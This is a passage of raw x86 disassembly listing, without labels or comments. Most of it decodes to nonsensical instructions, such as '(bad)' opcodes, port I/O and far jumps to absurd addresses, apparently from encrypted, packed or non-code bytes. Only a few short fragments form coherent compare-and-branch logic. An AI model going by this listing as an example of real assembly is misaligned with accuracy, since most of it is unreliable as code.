  407f2b:	lds    ebx,FWORD PTR [esi+ebx*2+0x5a]
  407f2f:	push   ebx
  407f30:	or     al,0x87
  407f32:	or     BYTE PTR [esi+0x48],bh
  407f35:	pop    ebp
  407f36:	hlt    
  407f37:	mov    al,0x41
  407f39:	pop    esp
  407f3a:	cs enter 0x4e17,0x82
  407f3f:	xor    cl,BYTE PTR [ebp+0x36]
  407f42:	loopne 0x407ef4
  407f44:	cmp    BYTE PTR [edi+0x6f],0xc8
  407f48:	(bad)  
  407f49:	mov    BYTE PTR [ecx+0x1c],ch
  407f4c:	test   BYTE PTR [esi-0x12a53b13],bl
  407f52:	mov    esp,DWORD PTR [edi-0x74]
  407f55:	fistp  WORD PTR ds:0xdf885fc7
  407f5b:	xchg   edi,eax
  407f5c:	pop    fs
  407f5e:	mov    al,0xb2
  407f60:	inc    edx
  407f61:	ins    DWORD PTR es:[edi],dx
  407f62:	push   cs
  407f63:	js     0x407f1c
  407f65:	xor    BYTE PTR [edi],cl
  407f67:	mov    ds:0xb0e7c6bd,eax
  407f6c:	add    cl,dl
  407f6e:	ja     0x31b4f4f5
  407f74:	mov    ecx,0x2e34d0f4
  407f79:	xchg   DWORD PTR [edi+0x6a],ebx
  407f7c:	loop   0x407f38
  407f7e:	shl    DWORD PTR [ecx+0x1b2e5817],0x8c
  407f85:	or     ch,BYTE PTR [ebx+0x57]
  407f88:	stos   DWORD PTR es:[edi],eax
  407f89:	sbb    ah,BYTE PTR [esi+0x7d1b2bd3]
  407f8f:	pusha  
  407f90:	adc    eax,0x973fafd
  407f95:	xchg   edi,eax
  407f96:	jl     0x407feb
  407f98:	in     eax,dx
  407f99:	mov    esi,edx
  407f9b:	(bad)  [edi-0x2e]
  407f9e:	jae    0x407fbb
  407fa0:	aaa    
  407fa1:	inc    edi
  407fa2:	mov    ebx,0x4d396132
  407fa7:	scas   eax,DWORD PTR es:[edi]
  407fa8:	cmc    
  407fa9:	pop    ecx
  407faa:	ret    
  407fab:	push   ds
  407fac:	mov    al,0xab
  407fae:	sub    ch,BYTE PTR [ecx]
  407fb0:	sbb    ebp,DWORD PTR [ebx]
  407fb2:	jne    0x407f6a
  407fb4:	or     ch,bh
  407fb6:	cmc    
  407fb7:	test   al,0x2b
  407fb9:	pop    esp
  407fba:	ror    ch,cl
  407fbc:	out    0xfc,al
  407fbe:	imul   edi,DWORD PTR [ebp+0x49f35b66],0xc729d94c
  407fc8:	jge    0x407fa3
  407fca:	adc    BYTE PTR [esi-0x96208c6],bh
  407fd0:	nop
  407fd1:	lods   eax,DWORD PTR ds:[esi]
  407fd2:	inc    ebx
  407fd3:	int    0x40
  407fd5:	imul   ecx,DWORD PTR [esi-0x5b],0x4c
  407fd9:	les    ebp,FWORD PTR [edx+0x74d9e551]
  407fdf:	cmp    DWORD PTR [ebx+0x58],ebx
  407fe2:	mov    ds:0xa7203dd4,al
  407fe7:	xor    dl,bl
  407fe9:	mov    al,ds:0x5f711f16
  407fee:	call   0x24f1f1e5
  407ff3:	xor    al,0xb9
  407ff5:	pusha  
  407ff6:	jecxz  0x408056
  407ff8:	jecxz  0x407fba
  407ffa:	pop    edx
  407ffb:	pop    esp
  407ffc:	xor    DWORD PTR [ecx+0x7099a77c],0xffffffbf
  408003:	mov    DWORD PTR [ebx-0x6],ecx
  408006:	adc    eax,0x1871e278
  40800b:	mov    ebx,0x3e5dc6c7
  408010:	jae    0x407fe6
  408012:	adc    BYTE PTR [eax],cl
  408014:	jne    0x40801d
  408016:	icebp  
  408017:	cwde   
  408018:	lods   al,BYTE PTR ds:[esi]
  408019:	fsubr  QWORD PTR [eax+0x4ea85d71]
  40801f:	pop    ebp
  408020:	mov    eax,0xeb163c3c
  408025:	mov    esi,0xb32b386b
  40802a:	(bad)  
  40802b:	fdivr  DWORD PTR [ebx+0x3b16390]
  408031:	jp     0x407fdb
  408033:	(bad)  
  408034:	mov    dh,BYTE PTR [eax]
  408036:	mov    dl,0x70
  408038:	inc    esi
  408039:	gs pop ebp
  40803b:	loop   0x407ffe
  40803d:	repz push eax
  40803f:	pop    ecx
  408040:	fs xchg edi,eax
  408042:	out    dx,eax
  408043:	ret    
  408044:	into   
  408045:	ficom  DWORD PTR [ecx+0x34]
  408048:	dec    eax
  408049:	adc    cl,BYTE PTR [ecx-0x3fec27b6]
  40804f:	mov    edx,0x9d392a17
  408054:	daa    
  408055:	bound  edx,QWORD PTR [edx+0x5104cb15]
  40805b:	int3   
  40805c:	fwait
  40805d:	inc    esi
  40805e:	push   esi
  40805f:	dec    ebp
  408060:	aam    0x81
  408062:	dec    edx
  408063:	in     eax,dx
  408064:	push   es
  408065:	imul   ch
  408067:	jno    0x40801c
  408069:	xor    al,0xeb
  40806b:	mov    ds:0x99756d8b,al
  408070:	dec    ecx
  408071:	jnp    0x408068
  408073:	ret    
  408074:	test   BYTE PTR [edx],bl
  408076:	mov    dh,0x6d
  408078:	xchg   edx,eax
  408079:	rol    bl,1
  40807b:	or     BYTE PTR [edx+0x9],ch
  40807e:	sbb    eax,0xed162fac
  408083:	pop    eax
  408084:	int3   
  408085:	jb     0x408021
  408087:	dec    edi
  408088:	sbb    edi,DWORD PTR [esi+0x10be27fc]
  40808e:	retf   0xb2ed
  408091:	js     0x408104
  408093:	xor    BYTE PTR [ecx+0x5e],0x57
  408097:	xchg   edx,eax
  408098:	add    eax,0x45e97f1c
  40809d:	and    eax,0x36c1ee37
  4080a2:	mov    al,0xcd
  4080a4:	hlt    
  4080a5:	call   0xbc94:0x9670ff06
  4080ac:	nop
  4080ad:	and    dh,BYTE PTR [edx-0x22]
  4080b0:	mov    ecx,0x1b8ac8a3
  4080b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080b6:	mov    dh,0x27
  4080b8:	out    0xb,eax
  4080ba:	loop   0x408133
  4080bc:	fwait
  4080bd:	cmp    al,0xa6
  4080bf:	xor    dh,al
  4080c1:	or     al,0x61
  4080c3:	inc    ecx
  4080c4:	inc    esp
  4080c5:	cmp    BYTE PTR [ebx-0x4bc07220],ah
  4080cb:	lods   al,BYTE PTR ds:[esi]
  4080cc:	cmc    
  4080cd:	mov    ds:0x33ca62d5,eax
  4080d2:	rol    DWORD PTR [ebx],0xc6
  4080d5:	mov    DWORD PTR [edx],eax
  4080d7:	mov    eax,DWORD PTR [ebp-0x8]
  4080da:	xor    eax,ecx
  4080dc:	add    eax,esi
  4080de:	mov    DWORD PTR [ebp+0x8],eax
  4080e1:	mov    eax,DWORD PTR [ebp+0x8]
  4080e4:	jmp    0x4083ed
  4080e9:	ret    
  4080ea:	ror    ch,1
  4080ec:	rcr    ecx,0xc9
  4080ef:	rcl    esi,cl
  4080f1:	push   edx
  4080f2:	add    DWORD PTR [edx-0x50f8e18b],eax
  4080f8:	cmp    dh,ah
  4080fa:	fnstsw WORD PTR [eax+0x78]
  4080fd:	fs jle 0x408178
  408100:	js     0x40809b
  408102:	leave  
  408103:	ffreep st(5)
  408105:	push   es
  408106:	or     eax,0x5014ead7
  40810b:	daa    
  40810c:	hlt    
  40810d:	xchg   esp,eax
  40810e:	sub    al,0x97
  408110:	stos   DWORD PTR es:[edi],eax
  408111:	idiv   BYTE PTR [edx+0x6b3c850]
  408117:	xor    ebp,ebx
  408119:	in     eax,dx
  40811a:	mov    bl,0xfa
  40811c:	in     al,0x2d
  40811e:	push   esi
  40811f:	std    
  408120:	lds    esp,FWORD PTR [esi]
  408122:	jae    0x408184
  408124:	push   ebx
  408125:	xchg   esi,eax
  408126:	sub    BYTE PTR [edx+esi*2+0x7aa8df2a],al
  40812d:	sbb    bl,BYTE PTR [ecx+0x8a7bed2]
  408133:	mov    al,0xb9
  408135:	sbb    BYTE PTR [edi+0x78797016],0x14
  40813c:	stos   BYTE PTR es:[edi],al
  40813d:	fistp  WORD PTR [ecx]
  40813f:	cwde   
  408140:	shr    BYTE PTR [esi-0x1c],cl
  408143:	add    edi,esp
  408145:	mov    al,ds:0xd104ae73
  40814a:	sti    
  40814b:	stos   BYTE PTR es:[edi],al
  40814c:	push   esp
  40814d:	je     0x4081b1
  40814f:	jne    0x40816e
  408151:	sbb    cl,dl
  408153:	adc    eax,0x2b
  408156:	adc    BYTE PTR [ebp+0x65],bl
  408159:	bound  eax,QWORD PTR [edi]
  40815b:	ret    0x4134
  40815e:	aad    0xd1
  408160:	adc    al,0xcd
  408162:	sub    eax,0xa587998b
  408167:	or     DWORD PTR [eax],esp
  408169:	in     al,dx
  40816a:	popa   
  40816b:	lods   eax,DWORD PTR ds:[esi]
  40816c:	pushf  
  40816d:	and    al,0xa
  40816f:	mov    dh,0x59
  408171:	stos   BYTE PTR es:[edi],al
  408172:	daa    
  408173:	fwait
  408174:	test   al,0xdd
  408176:	mov    cs,WORD PTR [edi+0x4e580c5f]
  40817c:	fist   DWORD PTR [edi-0x48]
  40817f:	push   ebp
  408180:	sahf   
  408181:	rol    BYTE PTR [ebx-0x2fb0dd0a],cl
  408187:	in     al,0xb3
  408189:	adc    dh,0x6
  40818c:	adc    BYTE PTR [eax+0x3f],cl
  40818f:	fcmovnbe st,st(6)
  408191:	sub    DWORD PTR [esi+0xe],ecx
  408194:	lods   al,BYTE PTR ds:[esi]
  408195:	lea    edx,[ebp+0x21]
  408198:	inc    ebp
  408199:	mov    ch,0xbb
  40819b:	shl    DWORD PTR ss:[ebp-0x60d9eb03],cl
  4081a2:	add    eax,0x5538a8f7
  4081a7:	cmc    
  4081a8:	jae    0x40812a
  4081aa:	mov    ebp,0xd090067a
  4081af:	xchg   DWORD PTR [ecx+0x540a574],ebp
  4081b5:	dec    edi
  4081b6:	xadd   DWORD PTR [eax],ebx
  4081b9:	push   0x904ec49d
  4081be:	dec    edi
  4081bf:	adc    ch,BYTE PTR [ebp+0x495183a0]
  4081c5:	mov    dh,0xe
  4081c7:	add    edi,edx
  4081c9:	nop
  4081ca:	mov    dl,0xb8
  4081cc:	mov    ah,0xf6
  4081ce:	pop    edi
  4081cf:	sub    al,ah
  4081d1:	mov    eax,ds:0x15f63ce7
  4081d6:	mov    BYTE PTR [ebx],dh
  4081d8:	inc    ebp
  4081d9:	inc    esp
  4081da:	mov    ebx,esi
  4081dc:	rcr    BYTE PTR [esi+0x6dbcb7ea],cl
  4081e2:	jle    0x40824d
  4081e4:	rcr    BYTE PTR gs:[edx-0x1ce6b019],0x89
  4081ec:	icebp  
  4081ed:	inc    ebx
  4081ee:	(bad)
  4081f1:	mov    esi,0x78550ff8
  4081f6:	je     0x408198
  4081f8:	in     eax,dx
  4081f9:	loop   0x4081b1
  4081fb:	xchg   ebx,eax
  4081fc:	loope  0x408207
  4081fe:	dec    ecx
  4081ff:	div    DWORD PTR [esi+eiz*2-0xe]
  408203:	pop    ds
  408204:	push   ss
  408205:	xchg   esi,eax
  408206:	leave  
  408207:	lods   eax,DWORD PTR ds:[esi]
  408208:	(bad)  
  408209:	pop    esp
  40820a:	nop
  40820b:	push   ecx
  40820c:	bsf    edi,DWORD PTR [ebx+0x538a3aec]
  408213:	ret    
  408214:	xor    ebp,esp
  408216:	inc    eax
  408217:	hlt    
  408218:	ret    0x720a
  40821b:	jmp    0xc0933e57
  408220:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408221:	inc    ecx
  408222:	fld    TBYTE PTR [edx-0x2cb490d2]
  408228:	mov    dh,0xc3
  40822a:	retf   0x976b
  40822d:	fstp   DWORD PTR [eax-0x4a182d65]
  408233:	push   esi
  408234:	add    al,BYTE PTR [eax-0x66c36139]
  40823a:	pop    edx
  40823b:	jmp    0x408202
  40823d:	mov    eax,ds:0x2830b2d7
  408242:	pop    edx
  408243:	fadd   DWORD PTR [edi-0x11c85f0c]
  408249:	je     0x408263
  40824b:	pushf  
  40824c:	das    
  40824d:	sub    esi,DWORD PTR cs:[ebx+0x7a12fc2b]
  408254:	add    BYTE PTR [ecx+ecx*8-0x25],bh
  408258:	jne    0x40823d
  40825a:	(bad)  
  40825b:	in     eax,dx
  40825c:	addr16 mov ds:0xb72,eax
  408260:	adc    eax,0xde9122c7
  408265:	and    BYTE PTR [esi],cl
  408267:	adc    dl,BYTE PTR [eax]
  408269:	retf   
  40826a:	xor    DWORD PTR [edx-0x17ca3daf],eax
  408270:	fstp   TBYTE PTR ds:0x6199ced4
  408276:	cmc    
  408277:	rcr    BYTE PTR [edx],cl
  408279:	adc    eax,0xcdcda27b
  40827e:	imul   ebp,DWORD PTR [esi+0x5b7e9ff3],0x4a1fb828
  408288:	rcr    BYTE PTR [esi+ebp*4],cl
  40828b:	adc    ecx,DWORD PTR [edi-0x39b09f71]
  408291:	mov    esp,0x6fcee870
  408296:	in     eax,dx
  408297:	pushf  
  408298:	xchg   edi,eax
  408299:	outs   dx,DWORD PTR ss:[esi]
  40829b:	jnp    0x408265
  40829d:	inc    esi
  40829e:	xor    ah,ch
  4082a0:	mov    ah,0xb9
  4082a2:	inc    esi
  4082a3:	enter  0x7e84,0x1c
  4082a7:	mov    eax,ds:0x772c8025
  4082ac:	rcl    ecx,1
  4082ae:	cmp    bh,ah
  4082b0:	sbb    bh,ch
  4082b2:	mov    cr6,esp
  4082b5:	inc    esi
  4082b6:	hlt    
  4082b7:	imul   ecx,DWORD PTR [ebp-0x3a71b841],0x5e
  4082be:	bt     DWORD PTR [eax],ebx
  4082c1:	scas   al,BYTE PTR es:[edi]
  4082c2:	ins    DWORD PTR es:[edi],dx
  4082c3:	inc    esi
  4082c4:	ins    BYTE PTR es:[edi],dx
  4082c5:	xor    esp,DWORD PTR [edx-0x27]
  4082c8:	sar    DWORD PTR [ebx-0x5a],1
  4082cb:	adc    al,0x5b
  4082cd:	popa   
  4082ce:	sub    ch,BYTE PTR [esp+edi*8]
  4082d1:	dec    edx
  4082d2:	xor    edx,DWORD PTR ds:0xb12297af
  4082d8:	lods   al,BYTE PTR ds:[esi]
  4082d9:	bound  edi,QWORD PTR [eax]
  4082db:	jae    0x4082e1
  4082dd:	ins    DWORD PTR es:[edi],dx
  4082de:	nop
  4082df:	rcr    ecx,1
  4082e1:	shl    BYTE PTR ds:0x99b423c0,0x31
  4082e8:	inc    esi
  4082e9:	leave  
  4082ea:	pusha  
  4082eb:	(bad)  
  4082ed:	add    eax,edi
  4082ef:	push   cs
  4082f0:	sub    al,0x2b
  4082f2:	scas   eax,DWORD PTR es:[edi]
  4082f3:	or     BYTE PTR [edi],0x9e
  4082f6:	sahf   
  4082f7:	fild   WORD PTR [esi+0x3c]
  4082fa:	cld    
  4082fb:	stc    
  4082fc:	jmp    0x408344
  4082fe:	jg     0x408315
  408300:	or     DWORD PTR [eax],esi
  408302:	test   al,0x37
  408304:	adc    ah,BYTE PTR [edi]
  408306:	add    eax,0x9f29c536
  40830b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40830c:	mov    WORD PTR [edx-0x55],?
  40830f:	stc    
  408310:	cmp    cl,cl
  408312:	jmp    0x4082ae
  408314:	cdq    
  408315:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408316:	xchg   edi,eax
  408317:	xlat   BYTE PTR ds:[ebx]
  408318:	inc    ecx
  408319:	shl    DWORD PTR [eax],1
  40831b:	cmc    
  40831c:	sahf   
  40831d:	and    ebx,ecx
  40831f:	xor    ecx,DWORD PTR [ebp+esi*4-0x36b94904]
  408326:	test   dl,bh
  408328:	or     eax,0xe0df9296
  40832d:	daa    
  40832e:	xchg   esi,eax
  40832f:	in     al,0x5b
  408331:	dec    ecx
  408332:	mov    eax,0xc455eba7
  408337:	(bad)  
  408338:	in     eax,0x10
  40833a:	mov    ebx,0x7041d9b6
  40833f:	aas    
  408340:	(bad)
  408343:	je     0x4082d6
  408345:	jne    0x408341
  408347:	cmp    al,0x4c
  408349:	push   eax
  40834a:	pop    eax
  40834b:	mov    esp,0xff0e86b9
  408350:	sub    DWORD PTR [ecx+0x16ecd437],edi
  408356:	int3   
  408357:	pop    ebp
  408358:	pop    ss
  408359:	mov    ds:0x4116224c,al
  40835e:	or     al,0x7a
  408360:	jecxz  0x40832a
  408362:	adc    esi,ecx
  408364:	cmp    cl,BYTE PTR [esi]
  408366:	ret    0xb0dd
  408369:	(bad)  
  40836a:	jmp    0xcc17:0xab6d2f2d
  408371:	xor    ebx,0x3d
  408374:	pxor   mm0,QWORD PTR [ecx+0x13]
  408378:	jecxz  0x408341
  40837a:	dec    edi
  40837b:	(bad)  
  40837c:	pop    eax
  40837d:	push   0x891edf9e
  408382:	imul   eax,DWORD PTR [eax],0x6b
  408385:	jne    0x408402
  408387:	push   ebp
  408388:	jecxz  0x4083a6
  40838a:	cmp    esp,DWORD PTR [ebx+0x1d]
  40838d:	jnp    0x408318
  40838f:	mov    ds:0xb8b262c,eax
  408394:	xchg   ecx,eax
  408395:	mov    cl,0xff
  408397:	popa   
  408398:	push   esi
  408399:	add    dh,BYTE PTR [edi+eiz*1+0x75e100c5]
  4083a0:	stc    
  4083a1:	sbb    al,0xf5
  4083a3:	sbb    DWORD PTR [ebx+edi*1],eax
  4083a6:	jno    0x408395
  4083a8:	pop    ss
  4083a9:	mov    esi,0x8fa2b15e
  4083ae:	in     eax,0x6c
  4083b0:	pop    ebp
  4083b1:	in     eax,0x84
  4083b3:	push   edx
  4083b4:	inc    edi
  4083b5:	(bad)  
  4083b6:	in     eax,0x12
  4083b8:	push   edx
  4083b9:	inc    edx
  4083ba:	jge    0x40842a
  4083bc:	mov    ah,0xcb
  4083be:	ins    BYTE PTR es:[edi],dx
  4083bf:	ss xor ch,dh
  4083c2:	mov    edi,0xa42f8b80
  4083c7:	enter  0x6f79,0x45
  4083cb:	fidiv  WORD PTR ds:0x2ff1aa58
  4083d1:	js     0x40839b
  4083d3:	fisttp QWORD PTR [ebp-0x372c91b2]
  4083d9:	sbb    BYTE PTR [esi+ebp*4+0x62],0x33
  4083de:	adc    BYTE PTR [ebx+0x3d],ch
  4083e1:	adc    ah,BYTE PTR [ebp-0xa]
  4083e4:	adc    al,0xdf
  4083e6:	mov    ebx,0xdf457647
  4083eb:	push   es
  4083ec:	sbb    ecx,DWORD PTR [edx-0x7557fabc]
  4083f2:	push   ebp
  4083f3:	(bad)  
  4083f4:	cmp    al,dl
  4083f6:	je     0x408742
  4083fc:	mov    eax,DWORD PTR [ebp+0x8]
  4083ff:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  408403:	mov    edx,DWORD PTR [ebp+0xc]
  408406:	cmp    al,BYTE PTR [edx]
  408408:	jne    0x408a71
  40840e:	mov    eax,DWORD PTR [ebp-0x8]
  408411:	mov    edx,DWORD PTR [ebp+0xc]
  408414:	movsx  edx,BYTE PTR [edx]
  408417:	xor    eax,ecx
  408419:	add    eax,esi
  40841b:	cmp    edx,eax
  40841d:	je     0x40875c
  408423:	mov    DWORD PTR [ebp-0x18],0x705fd8e
  40842a:	jmp    0x408733
  40842f:	cmp    al,0xc8
  408431:	rcl    dl,0xd4
  408434:	fcmovu st,st(2)
  408436:	into   
  408437:	(bad)  
  408438:	leave  
  408439:	xchg   BYTE PTR [edi+0x4e82c702],dl
  40843f:	loopne 0x408423
  408441:	js     0x4084bb
  408443:	fs jle 0x4084be
  408446:	js     0x4084a3
  408448:	fmul   DWORD PTR [esp+eax*2]
  40844b:	xchg   edi,eax
  40844c:	pop    edx
  40844d:	ss push ebp
  40844f:	fimul  WORD PTR [eax+esi*8+0x3a1b3ea7]
  408456:	cmp    al,0xef
  408458:	cwde   
  408459:	(bad)  
  40845a:	adc    ebp,edx
  40845c:	push   eax
  40845d:	repnz cmps DWORD PTR gs:[esi],DWORD PTR es:[edi]
  408460:	mov    bl,0x55
  408462:	sub    eax,0x60291cae
  408467:	pop    ss
  408468:	add    dh,BYTE PTR [ebx]
  40846a:	add    al,0x6e
  40846c:	sub    eax,0x333e26a4
  408471:	leave  
  408472:	cld    
  408473:	xor    edi,ebx
  408475:	leave  
  408476:	sub    al,0xce
  408478:	dec    esi
  408479:	cs mov cl,0xbc
  40847c:	jp     0x408437
  40847e:	jne    0x4084b9
  408480:	lods   eax,DWORD PTR ds:[esi]
  408481:	je     0x408445
  408483:	pop    ss
  408484:	jmp    0x40840e
  408486:	cmp    esp,DWORD PTR [ebx-0x1]
  408489:	dec    ebx
  40848a:	dec    esp
  40848b:	stos   BYTE PTR es:[edi],al
  40848c:	adc    al,0x1
  40848e:	aaa    
  40848f:	dec    ebp
  408490:	out    dx,eax
  408491:	mov    ebp,0xc93a74fc
  408496:	pusha  
  408497:	jg     0x4084fd
  408499:	stos   BYTE PTR es:[edi],al
  40849a:	or     eax,0x4b83f345
  40849f:	hlt    
  4084a0:	and    eax,esp
  4084a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084a3:	scas   al,BYTE PTR es:[edi]
  4084a4:	fs ret 
  4084a6:	jb     0x40842b
  4084a8:	sbb    edx,0x749aec95
  4084ae:	int3   
  4084af:	jg     0x40850a
  4084b1:	repnz cld 
  4084b3:	sub    eax,0xb6770708
  4084b8:	mov    ds:0x2156cf78,al
  4084bd:	pop    esp
  4084be:	jnp    0x408450
  4084c0:	dec    edi
  4084c1:	daa    
  4084c2:	rol    DWORD PTR [esi-0x674e5472],cl
  4084c8:	pop    ds
  4084c9:	xchg   edi,eax
  4084ca:	push   edx
  4084cb:	cmc    
  4084cc:	push   edi
  4084cd:	mov    esp,0x5109d38
  4084d2:	imul   ebx,DWORD PTR [ebx-0x1f62096e],0x5dbbf6d5
  4084dc:	lods   eax,DWORD PTR ds:[esi]
  4084dd:	jno    0x408546
  4084df:	adc    cl,BYTE PTR [ecx+0x6026122]
  4084e5:	adc    DWORD PTR ds:0xd3948b28,edi
  4084eb:	push   ecx
  4084ec:	and    bh,ch
  4084ee:	or     dl,BYTE PTR [edx]
  4084f0:	lahf   
  4084f1:	jno    0x4084fb
  4084f3:	out    dx,al
  4084f4:	pop    edx
  4084f5:	inc    esp
  4084f6:	fstp   QWORD PTR [edx+0xb47fc5]
  4084fc:	fs scas eax,DWORD PTR es:[edi]
  4084fe:	and    bl,bl
  408500:	or     BYTE PTR ds:0x9c9afdd6,dh
  408506:	int    0x22
  408508:	(bad)  
  408509:	push   ds
  40850a:	std    
  40850b:	arpl   WORD PTR ds:0x61c20d36,di
  408511:	xchg   eax,ebx
  408513:	sbb    BYTE PTR [eax],ch
  408515:	pop    ss
  408516:	add    ebx,DWORD PTR [eax+0x42]
  408519:	rcl    BYTE PTR [ecx],1
  40851b:	pop    esp
  40851c:	and    BYTE PTR [edi+0x61e5e808],cl
  408522:	mov    ah,BYTE PTR ds:0xb5d76786
  408528:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40852a:	fdivr  DWORD PTR [edi]
  40852c:	std    
  40852d:	ds and bl,bh
  408530:	adc    BYTE PTR [esi-0x59],0x6c
  408534:	dec    edx
  408535:	fld    st(2)
  408537:	shr    DWORD PTR [esi+0x3f850994],cl
  40853d:	mov    WORD PTR [eax],es
  40853f:	xchg   ecx,eax
  408540:	fistp  WORD PTR [edx]
  408542:	popf   
  408543:	fst    QWORD PTR [edi+0x425f20dc]
  408549:	mov    dl,0x64
  40854b:	mov    edi,0xa25bd057
  408550:	push   ss
  408551:	or     ebx,esp
  408553:	aaa    
  408554:	pop    eax
  408555:	les    esi,FWORD PTR [esp+ebx*2+0x64bd47a2]
  40855c:	mov    ds:0x470e6790,eax
  408561:	cmp    DWORD PTR [edx-0x5f],esi
  408564:	daa    
  408565:	mov    ds:0x1a00565c,eax
  40856a:	jmp    0x9474b8c7
  40856f:	and    ah,bh
  408571:	fsubr  QWORD PTR [ebp+0x15]
  408574:	jmp    0x3c44f4ca
  408579:	push   edx
  40857a:	jmp    0x72a8fc9f
  40857f:	push   ss
  408580:	shr    ecx,1
  408582:	inc    edx
  408583:	jle    0x40858a
  408585:	jne    0x408540
  408587:	xor    al,0x28
  408589:	and    DWORD PTR [ebp+0x2b],edx
  40858c:	jbe    0x408522
  40858e:	sbb    esi,ecx
  408590:	sbb    al,0x37
  408592:	jmp    FWORD PTR [edx-0x1de5b512]
  408598:	test   al,0xc
  40859a:	loopne 0x4085fe
  40859c:	add    ebx,DWORD PTR ds:0x7e860565
  4085a2:	xchg   esi,esi
  4085a4:	add    ah,ch
  4085a6:	cmp    cl,BYTE PTR [eax+0x52]
  4085a9:	imul   esp,DWORD PTR [ecx],0xffffffcf
  4085ac:	rol    BYTE PTR [esi-0x704f0ae4],cl
  4085b2:	adc    DWORD PTR [ebx+edx*1-0x40],0x85fe0d47
  4085ba:	ins    BYTE PTR es:[edi],dx
  4085bb:	fisub  DWORD PTR [ebx]
  4085bd:	cmp    ebp,esp
  4085bf:	je     0x408639
  4085c1:	shr    BYTE PTR [esi-0x6ec9ff7a],1
  4085c7:	out    dx,eax
  4085c8:	call   0xab78:0xa1452b95
  4085cf:	imul   eax,edi,0xffffffe7
  4085d2:	je     0x4085bc
  4085d4:	or     al,0xa7
  4085d7:	bndldx (bad),[eax-0x762dcdff]
  4085de:	fnstcw WORD PTR [edx-0x57]
  4085e1:	call   0x2ce7:0x1b3a82ae
  4085e8:	mov    cl,0x10
  4085ea:	xchg   DWORD PTR [ecx-0x4e],esp
  4085ed:	out    dx,al
  4085ee:	or     eax,0x1e2b4697
  4085f3:	mov    esp,0x81652d8f
  4085f8:	cmc    
  4085f9:	mov    ds:0x7f3088f8,al
  4085ff:	into   
  408600:	out    dx,eax
  408601:	int3   
  408602:	mov    ebx,0xd5df1391
  408607:	rcl    edi,cl
  408609:	xchg   edi,eax
  40860a:	rol    DWORD PTR [eax-0x72846b46],0xb0
  408611:	jecxz  0x408666
  408613:	repnz (bad) 
  408616:	jge    0x40860f
  408618:	test   eax,0x94c4b848
  40861d:	daa    
  40861e:	jo     0x40866f
  408620:	shl    cl,cl
  408622:	xor    al,BYTE PTR [eax+eax*1-0xd6dbef9]
  408629:	cli    
  40862a:	sbb    bl,dl
  40862c:	stos   DWORD PTR es:[edi],eax
  40862d:	stos   BYTE PTR es:[edi],al
  40862e:	pop    edi
  40862f:	int    0xcb
  408631:	mov    dh,0x91
  408633:	jmp    0x1f73f95c
  408638:	inc    eax
  408639:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40863a:	lock shr DWORD PTR [ecx-0x5b682461],1
  408641:	jno    0x408619
  408643:	enter  0xf68a,0xfe
  408647:	cs iretw 
  40864a:	daa    
  40864b:	jl     0x408649
  40864d:	data16 int3 
  40864f:	mov    esp,0xb457f7d3
  408654:	cs mov dl,0x56
  408657:	ret    0x5954
  40865a:	arpl   WORD PTR [ebx+0x7416d918],dx
  408660:	mov    ch,0x90
  408662:	imul   eax,DWORD PTR [ecx-0x5d],0xc15c3892
  408669:	test   BYTE PTR ds:0x15e59014,bl
  40866f:	push   0x6b
  408671:	repz (bad) 
  408673:	(bad)  
  408674:	push   ebx
  408675:	inc    ebp
  408676:	cmp    eax,0x8dc6699e
  40867b:	mov    dl,0x18
  40867d:	pop    edi
  40867e:	adc    ebp,DWORD PTR [eax+0x18]
  408681:	in     eax,dx
  408682:	push   esp
  408683:	cmp    al,0x2f
  408685:	ins    DWORD PTR es:[edi],dx
  408686:	enter  0xf3d8,0x34
  40868a:	call   0x16ef0140
  40868f:	and    BYTE PTR [ebp-0x6577ecb],bl
  408695:	xlat   BYTE PTR ds:[ebx]
  408696:	ret    
  408697:	pushf  
  408698:	inc    ebx
  408699:	or     eax,0x6b42e91f
  40869e:	mov    ds:0xcbe6bb93,al
  4086a3:	jg     0x4086f8
  4086a5:	xor    ecx,ebp
  4086a7:	push   eax
  4086a8:	nop
  4086a9:	mov    esp,0x27f2b4be
  4086ae:	push   0x54
  4086b0:	inc    ebx
  4086b1:	mov    ah,0xf1
  4086b3:	ror    BYTE PTR [ebx-0x43],cl
  4086b6:	jecxz  0x4086bf
  4086b8:	or     edi,DWORD PTR [ebx+0x14e8c45e]
  4086be:	inc    edi
  4086bf:	mov    bh,0x8d
  4086c1:	fcomp  DWORD PTR [ecx]
  4086c3:	test   BYTE PTR [ebx+0x4141dfc3],al
  4086c9:	jl     0x4086e0
  4086cb:	(bad)  
  4086cc:	pushf  
  4086cd:	div    DWORD PTR [eax-0x2c1085c]
  4086d3:	leave  
  4086d4:	enter  0x608e,0x7a
  4086d8:	aas    
  4086d9:	xchg   DWORD PTR [ebx+0x5f7cc3ca],eax
  4086df:	pop    edx
  4086e0:	add    DWORD PTR [ebp+0x30],0x7c4d5b38
  4086e7:	stos   BYTE PTR es:[edi],al
  4086e8:	stc    
  4086e9:	mov    ebx,0x9e681c6e
  4086ee:	inc    eax
  4086ef:	mov    BYTE PTR ds:[ebp-0x399c96d9],al
  4086f6:	add    dh,dh
  4086f8:	or     eax,0xd8708e74
  4086fd:	out    dx,eax
  4086fe:	fs or  eax,0x1e7d2dcf
  408704:	jg     0x40869b
  408706:	xor    al,0xfb
  408708:	clc    
  408709:	xlat   BYTE PTR ds:[ebx]
  40870a:	(bad)  
  40870b:	retf   
  40870c:	lock mov WORD PTR [edi*4+0x590f7c08],ds
  408714:	stos   DWORD PTR es:[edi],eax
  408715:	into   
  408716:	mov    eax,ds:0x9f5efee
  40871b:	sbb    al,0x54
  40871d:	jle    0x4086a4
  40871f:	dec    edi
  408720:	stos   BYTE PTR es:[edi],al
  408721:	push   edx
  408722:	stos   BYTE PTR es:[edi],al
  408723:	popf   
  408724:	enter  0xcf4d,0x15
  408728:	lods   eax,DWORD PTR ds:[esi]
  408729:	pop    ebx
  40872a:	inc    esi
  40872b:	ret    
  40872c:	mov    esi,0x2c77b2a9
  408731:	push   edx
  408732:	dec    ecx
  408733:	lea    eax,[ebp-0x18]
  408736:	mov    DWORD PTR [ebp-0x14],eax
  408739:	mov    eax,DWORD PTR [ebp-0x14]
